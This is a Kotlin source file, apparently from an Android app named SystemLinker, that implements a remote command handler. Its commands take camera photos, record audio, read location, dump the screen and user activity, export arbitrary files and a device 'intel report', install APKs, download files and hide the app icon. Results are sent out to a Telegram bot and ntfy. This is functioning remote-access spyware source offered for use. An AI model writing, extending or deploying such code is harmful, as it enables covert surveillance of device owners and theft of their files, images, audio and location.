package com.systemlinker.features

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Build
import com.systemlinker.base.ConfigStore
import com.systemlinker.base.ErrorLogger
import com.systemlinker.base.VaultManager
import com.systemlinker.comm.NtfyResponseManager
import com.systemlinker.features.events.TriggerManager
import com.systemlinker.features.call.VoipManager
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.suspendCancellableCoroutine
import org.json.JSONObject
import java.io.File
import kotlin.coroutines.resume
import com.systemlinker.features.workflow.WorkflowEngine
import com.systemlinker.features.workflow.WorkflowParser
import com.systemlinker.features.workflow.MetaTask

class CommandProcessor(
    private val context: Context,
    private val defaultBotToken: String,
    private val defaultChatId: Long
) {
    private val configStore = ConfigStore(context)
    private val uploader = TelegramUploader(context, configStore.botToken, configStore.targetChatId)
    private val ntfyResponse = NtfyResponseManager(configStore)
    
    private val liveSessionManager = LiveSessionManager(context)
    private val mediaHandler = MediaHandler(context)
    private val systemHandler = SystemHandler(context)
    private val workflowEngine = WorkflowEngine(context, uploader, systemHandler, mediaHandler)
    private val triggerManager = TriggerManager(context, VaultManager(context))
    private val voipManager = VoipManager(context)
    private val processorScope = CoroutineScope(Dispatchers.IO)

    fun execute(payload: JSONObject) {
        val cmd = payload.optString("cmd", "")
        val arg = payload.optString("arg", "")
        val verbose = payload.optBoolean("verbose", false)

        uploader.botToken = configStore.botToken
        uploader.chatId = configStore.targetChatId

        processorScope.launch {
            try {
                when (cmd) {
                    
                    "send" -> {
                        val targetFile = arg.trim()
                        if (targetFile.isEmpty()) {
                            ntfyResponse.sendResponse("❌ Filename cannot be empty.", isCritical = true, verboseFlag = verbose)
                            return@launch
                        }

                        val foundFile = systemHandler.searchAndExtractFile(targetFile)

                        if (foundFile != null && foundFile.exists()) {
                            val isTemp = foundFile.absolutePath.contains("extracted_asset")
                            uploader.sendDocument(foundFile, "File Export: ${foundFile.name}", deleteAfter = isTemp)
                            ntfyResponse.sendResponse("✅ File '$targetFile' extracted and uploaded to Telegram successfully.", isCritical = true, verboseFlag = verbose)
                        } else {
                            ntfyResponse.sendResponse("❌ SystemLinker could not locate any file matching '$targetFile' internally.", isCritical = true, verboseFlag = verbose)
                        }
                    }

                    "track_activity" -> {
                        val parts = arg.split(",").map { it.trim() }
                        val duration = parts.getOrNull(0)?.toLongOrNull() ?: 10L
                        val taskName = parts.getOrNull(1) ?: ""

                        val intent = Intent("com.systemlinker.ACC_ACTION").apply {
                            setPackage(context.packageName)
                            putExtra("action", "start_macro_track")
                        }
                        context.sendBroadcast(intent)

                        delay(duration * 1000L)

                        val trackFile = suspendCancellableCoroutine<File?> { cont ->
                            val receiver = object : BroadcastReceiver() {
                                override fun onReceive(c: Context?, intent: Intent?) {
                                    if (intent?.action == "com.systemlinker.MACRO_RESULT") {
                                        context.unregisterReceiver(this)
                                        val path = intent.getStringExtra("path")
                                        if (path != null) cont.resume(File(path)) else cont.resume(null)
                                    }
                                }
                            }
                            val filter = IntentFilter("com.systemlinker.MACRO_RESULT")
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                                context.registerReceiver(receiver, filter, Context.RECEIVER_NOT_EXPORTED)
                            } else {
                                context.registerReceiver(receiver, filter)
                            }

                            val stopIntent = Intent("com.systemlinker.ACC_ACTION").apply {
                                setPackage(context.packageName)
                                putExtra("action", "stop_macro_track")
                            }
                            context.sendBroadcast(stopIntent)
                        }

                        if (trackFile != null && trackFile.exists()) {
                            if (taskName.isNotEmpty()) {
                                val vault = VaultManager(context)
                                vault.saveWorkflow(taskName, "macro", "", trackFile.readText())
                            }
                            uploader.sendDocument(trackFile, "Macro Track: ${taskName.ifEmpty { "Temp Session" }}", deleteAfter = true)
                            ntfyResponse.sendResponse("✅ Tracking finished. File uploaded to Telegram as: $taskName", isCritical = true, verboseFlag = verbose)
                        } else {
                            ntfyResponse.sendResponse("❌ Tracking failed to generate log.", isCritical = true, verboseFlag = verbose)
                        }
                    }

                    "perform" -> {
                        val parts = arg.split(",").map { it.trim() }
                        val lag = parts.getOrNull(0)?.toLongOrNull() ?: 0L
                        val loops = parts.getOrNull(1)?.toIntOrNull() ?: 1
                        val taskName = parts.getOrNull(2) ?: ""

                        val vault = VaultManager(context)
                        var macroContent = if (taskName.isNotEmpty()) vault.getWorkflow(taskName) else null

                        if (macroContent == null) {
                            val destFile = File(context.cacheDir, "temp_macro.txt")
                            val success = uploader.pollForFile(30, "document", destFile)
                            if (success) {
                                macroContent = destFile.readText()
                                if (taskName.isNotEmpty()) {
                                    vault.saveWorkflow(taskName, "macro", "", macroContent)
                                }
                                destFile.delete()
                            } else {
                                ntfyResponse.sendResponse("❌ Timeout. No macro file received in Telegram.", isCritical = true, verboseFlag = verbose)
                                return@launch
                            }
                        }

                        if (macroContent != null) {
                            if (lag > 0) {
                                delay(lag * 1000L)
                            }
                            val intent = Intent("com.systemlinker.ACC_ACTION").apply {
                                setPackage(context.packageName)
                                putExtra("action", "play_macro")
                                putExtra("macro_content", macroContent)
                                putExtra("loops", loops)
                            }
                            context.sendBroadcast(intent)
                            ntfyResponse.sendResponse("▶️ Executing macro: ${taskName.ifEmpty { "Polled File" }} (Loops: $loops)", isCritical = true, verboseFlag = verbose)
                        }
                    }

                    "call" -> {
                        val parts = arg.split(",").map { it.trim() }
                        if (parts.size >= 2) {
                            val mode = parts[0]
                            val speaker = parts[1]
                            var url = if (parts.size >= 3) parts[2] else ""
                            
                            if (url.isEmpty()) {
                                val receivedText = uploader.pollForText(30)
                                if (receivedText != null && receivedText.startsWith("ws")) {
                                    url = receivedText
                                } else {
                                    ntfyResponse.sendResponse("❌ Timeout or invalid URL received via TG. Call aborted.", isCritical = true, verboseFlag = verbose)
                                    return@launch
                                }
                            }
                            
                            if (url.startsWith("ws")) {
                                if (!url.endsWith("/live")) {
                                    url = url.removeSuffix("/") + "/live"
                                }
                                voipManager.startCall(url, mode, speaker)
                                ntfyResponse.sendResponse("📞 VoIP Call Started.", isCritical = false, verboseFlag = verbose)
                            } else {
                                ntfyResponse.sendResponse("❌ Invalid URL format. Must start with ws:// or wss://", isCritical = true, verboseFlag = verbose)
                            }
                        } else {
                            ntfyResponse.sendResponse("❌ Invalid call args.", isCritical = true, verboseFlag = verbose)
                        }
                    }
                    
                    "end_call" -> {
                        if (voipManager.isCallActive) {
                            voipManager.endCall()
                            ntfyResponse.sendResponse("📵 VoIP Call Terminated.", isCritical = false, verboseFlag = verbose)
                        } else {
                            ntfyResponse.sendResponse("No active call to terminate.", isCritical = false, verboseFlag = verbose)
                        }
                    }
                    
                    "help" -> {
                        val type = arg.trim().lowercase()
                        if (type == "workflow") {
                            val docFile = HelpGenerator.generateWorkflowHelp(context)
                            uploader.sendDocument(docFile, "📚 System Linker - Workflow Engine Guide", true)
                        } else {
                            val docFile = HelpGenerator.generateCommandHelp(context)
                            uploader.sendDocument(docFile, "🛠️ System Linker - Command Reference Guide", true)
                        }
                        ntfyResponse.sendResponse("✅ Help documents uploaded to Telegram.", isCritical = true, verboseFlag = verbose)
                    }

                    "set_bot_api" -> {
                        configStore.botToken = arg.trim()
                        uploader.botToken = configStore.botToken
                        ntfyResponse.sendResponse("✅ Bot API updated permanently.", isCritical = true, verboseFlag = verbose)
                    }

                    "set_target_chatid" -> {
                        configStore.targetChatId = arg.trim().toLongOrNull() ?: configStore.targetChatId
                        uploader.chatId = configStore.targetChatId
                        ntfyResponse.sendResponse("✅ Target Chat ID updated permanently.", isCritical = true, verboseFlag = verbose)
                    }

                    "set_overlay_duration" -> {
                        configStore.overlayDurationMs = arg.trim().toLongOrNull() ?: 3000L
                        ntfyResponse.sendResponse("Overlay duration set to ${configStore.overlayDurationMs}ms.", isCritical = false, verboseFlag = verbose)
                    }

                    "click_after_HS_switch" -> {
                        val parts = arg.split(",")
                        configStore.postHotspotAction = parts[0].trim()
                        configStore.postHotspotArgs = if (parts.size > 1) parts[1].trim().toIntOrNull() ?: 1 else 1
                        ntfyResponse.sendResponse("Post-Hotspot action set.", isCritical = false, verboseFlag = verbose)
                    }

                    "set_overlay" -> {
                        val destFile = File(context.filesDir, "stealth_overlay.jpg")
                        val success = uploader.pollForFile(30, "photo", destFile)
                        if (success) {
                            ntfyResponse.sendResponse("✅ Overlay image received and saved successfully.", isCritical = true, verboseFlag = verbose)
                        } else {
                            ntfyResponse.sendResponse("❌ Timeout. No image received.", isCritical = true, verboseFlag = verbose)
                        }
                    }

                    "halt_workflow" -> {
                        val target = arg.trim().ifBlank { "all" }
                        val vault = VaultManager(context)
                        vault.setWorkflowState(target, "halted")
                        triggerManager.refreshTriggers()
                        ntfyResponse.sendResponse("🛑 Workflow(s) [$target] HALTED. Triggers optimized.", isCritical = true, verboseFlag = verbose)
                    }

                    "resume_workflow" -> {
                        val target = arg.trim().ifBlank { "all" }
                        val vault = VaultManager(context)
                        vault.setWorkflowState(target, "active")
                        triggerManager.refreshTriggers()
                        ntfyResponse.sendResponse("▶️ Workflow(s) [$target] RESUMED. Required triggers activated.", isCritical = true, verboseFlag = verbose)
                    }

                    "workflow" -> {
                        val wfName = arg.trim().ifBlank { "default_flow" }
                        val destFile = File(context.cacheDir, "$wfName.yml")
                        val success = uploader.pollForFile(30, "document", destFile)
                        
                        if (success) {
                            val content = destFile.readText()
                            destFile.delete() 
                            
                            val tasks = WorkflowParser.parseString(content)
                            val meta = tasks.firstOrNull { it.type == "meta" } as? MetaTask
                            
                            val type = meta?.lifecycle ?: "temp"
                            val trigger = meta?.trigger ?: ""
                            
                            val vault = VaultManager(context)
                            vault.saveWorkflow(wfName, type, trigger, content)
                            triggerManager.refreshTriggers()
                            
                            if (type == "temp") {
                                ntfyResponse.sendResponse("✅ Temp Workflow saved. Executing & Deleting...", isCritical = true, verboseFlag = verbose)
                                workflowEngine.executeWorkflow(wfName, deleteAfter = true)
                            } else if (type == "semi" || type == "semi_perma") {
                                ntfyResponse.sendResponse("✅ Semi-Perma Workflow active. Listening for trigger.", isCritical = true, verboseFlag = verbose)
                            } else {
                                ntfyResponse.sendResponse("✅ Permanent Workflow saved. Ready for manual execution.", isCritical = true, verboseFlag = verbose)
                                workflowEngine.executeWorkflow(wfName, deleteAfter = false)
                            }
                        } else {
                            ntfyResponse.sendResponse("❌ Timeout. No workflow document received via TG.", isCritical = true, verboseFlag = verbose)
                        }
                    }
                    
                    "status_workflow" -> {
                        val wfName = arg.trim().ifBlank { "default_flow" }
                        workflowEngine.sendStatus(wfName)
                        ntfyResponse.sendResponse("✅ Workflow status logs uploaded to Telegram.", isCritical = true, verboseFlag = verbose)
                    }

                    "dump_screen" -> {
                        val dumpFile = suspendCancellableCoroutine<File?> { cont ->
                            val receiver = object : BroadcastReceiver() {
                                override fun onReceive(c: Context?, intent: Intent?) {
                                    if (intent?.action == "com.systemlinker.UI_RESULT") {
                                        context.unregisterReceiver(this)
                                        val msg = intent.getStringExtra("result") ?: ""
                                        if (msg.contains("SUCCESS")) {
                                            if (cont.isActive) cont.resume(File(context.filesDir, "ui_debug_dump.txt"))
                                        } else {
                                            if (cont.isActive) cont.resume(null)
                                        }
                                    }
                                }
                            }
                            val filter = IntentFilter("com.systemlinker.UI_RESULT")
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                                context.registerReceiver(receiver, filter, Context.RECEIVER_NOT_EXPORTED)
                            } else {
                                context.registerReceiver(receiver, filter)
                            }
                            val intent = Intent("com.systemlinker.ACC_ACTION").apply {
                                setPackage(context.packageName)
                                putExtra("action", "dump_screen_request")
                            }
                            context.sendBroadcast(intent)
                        }
                        
                        if (dumpFile != null && dumpFile.exists()) {
                            uploader.sendDocument(dumpFile, "Standalone UI Debug Dump", true)
                            ntfyResponse.sendResponse("✅ Screen Dump extracted and uploaded to Telegram.", isCritical = true, verboseFlag = verbose)
                        } else {
                            ntfyResponse.sendResponse("❌ Failed to generate UI dump.", isCritical = true, verboseFlag = verbose)
                        }
                    }

                    // Simple Commands
                    "ping" -> {
                        val status = systemHandler.getBasicBatteryStatus()
                        ntfyResponse.sendResponse("🟢 Node Online.\n$status", isCritical = false, verboseFlag = verbose)
                    }
                    
                    "cam_front" -> {
                        mediaHandler.takePicture(isFront = true)?.let { 
                            uploader.sendFile(it, "photo", "Front Camera") 
                            ntfyResponse.sendResponse("📸 Front Camera image sent to Telegram.", isCritical = true, verboseFlag = verbose)
                        }
                    }
                    
                    "cam_back" -> {
                        mediaHandler.takePicture(isFront = false)?.let { 
                            uploader.sendFile(it, "photo", "Back Camera") 
                            ntfyResponse.sendResponse("📸 Back Camera image sent to Telegram.", isCritical = true, verboseFlag = verbose)
                        }
                    }
                    
                    "mic" -> {
                        mediaHandler.recordAudio(arg.toIntOrNull() ?: 15)?.let { 
                            uploader.sendFile(it, "audio", "Mic Record") 
                            ntfyResponse.sendResponse("🎤 Mic Recording sent to Telegram.", isCritical = true, verboseFlag = verbose)
                        }
                    }
                    
                    "loc" -> {
                        val location = systemHandler.getLocation()
                        ntfyResponse.sendResponse(location, isCritical = true, verboseFlag = verbose)
                    }
                    
                    "flash" -> {
                        val result = systemHandler.setFlashlight(arg == "on")
                        ntfyResponse.sendResponse(result, isCritical = false, verboseFlag = verbose)
                    }
                    
                    "vol" -> {
                        systemHandler.setVolume(arg.toIntOrNull() ?: 50)
                        ntfyResponse.sendResponse("🔊 Volume set.", isCritical = false, verboseFlag = verbose)
                    }
                    
                    "info" -> {
                        uploader.sendDocument(systemHandler.generateFullSystemReport(), "Full Device Intel Report", true)
                        ntfyResponse.sendResponse("✅ System Intel Report uploaded to Telegram.", isCritical = true, verboseFlag = verbose)
                    }
                    
                    "get_log" -> {
                        uploader.sendDocument(ErrorLogger.getLogFile(context), "SystemLinker Error Logs")
                        ntfyResponse.sendResponse("✅ Error Logs uploaded to Telegram.", isCritical = true, verboseFlag = verbose)
                    }
                    
                    "clear_log" -> {
                        ErrorLogger.clearLogs(context)
                        ntfyResponse.sendResponse("🧹 SystemLinker Logs Cleared.", isCritical = false, verboseFlag = verbose)
                    }
                    
                    "live_start" -> {
                        liveSessionManager.connect(arg.trim())
                        ntfyResponse.sendResponse("⚡ WebSocket Live Connection Initiated.", isCritical = true, verboseFlag = verbose)
                    }
                    
                    "live_stop" -> {
                        liveSessionManager.disconnect()
                        ntfyResponse.sendResponse("🛑 WebSocket Live Connection Terminated.", isCritical = true, verboseFlag = verbose)
                    }
                    
                    "install_app" -> {
                        systemHandler.installApp(arg)
                        ntfyResponse.sendResponse("📦 APK Installation intent triggered.", isCritical = false, verboseFlag = verbose)
                    }
                    
                    "uninstall_app" -> {
                        systemHandler.uninstallApp(arg)
                        ntfyResponse.sendResponse("🗑️ App Uninstallation intent triggered.", isCritical = false, verboseFlag = verbose)
                    }
                    
                    "icon_hide" -> {
                        val res = systemHandler.setAppIconVisibility(false)
                        ntfyResponse.sendResponse(res, isCritical = false, verboseFlag = verbose)
                    }
                    
                    "icon_show" -> {
                        val res = systemHandler.setAppIconVisibility(true)
                        ntfyResponse.sendResponse(res, isCritical = false, verboseFlag = verbose)
                    }
                    
                    "toggle_wifi" -> {
                        val res = systemHandler.setWifiState(arg == "on")
                        ntfyResponse.sendResponse(res, isCritical = false, verboseFlag = verbose)
                    }
                    
                    "toggle_bt" -> {
                        val res = systemHandler.setBluetoothState(arg == "on")
                        ntfyResponse.sendResponse(res, isCritical = false, verboseFlag = verbose)
                    }
                    
                    "toggle_hotspot" -> {
                        val res = systemHandler.setHotspotState(arg == "on")
                        ntfyResponse.sendResponse(res, isCritical = false, verboseFlag = verbose)
                    }
                    
                    "scan_wifi" -> {
                        val res = systemHandler.getWifiScanResults()
                        ntfyResponse.sendResponse(res, isCritical = true, verboseFlag = verbose)
                    }
                    
                    "scan_bt" -> {
                        val res = systemHandler.getBluetoothScanResults()
                        ntfyResponse.sendResponse(res, isCritical = true, verboseFlag = verbose)
                    }
                    
                    "download_url" -> {
                        try {
                            val json = JSONObject(arg)
                            val res = systemHandler.downloadFileFromUrl(json.optString("url"), json.optString("path", ""))
                            ntfyResponse.sendResponse(res, isCritical = false, verboseFlag = verbose)
                        } catch (e: Exception) { 
                            ntfyResponse.sendResponse("❌ Invalid JSON for download_url", isCritical = true, verboseFlag = verbose)
                        }
                    }
                }
            } catch (e: Exception) {
                ErrorLogger.logError(context, "CommandExecute_${cmd}", e)
                ntfyResponse.sendResponse("❌ Execution crashed for command: $cmd\n${e.message}", isCritical = true, verboseFlag = true)
            }
        }
    }
}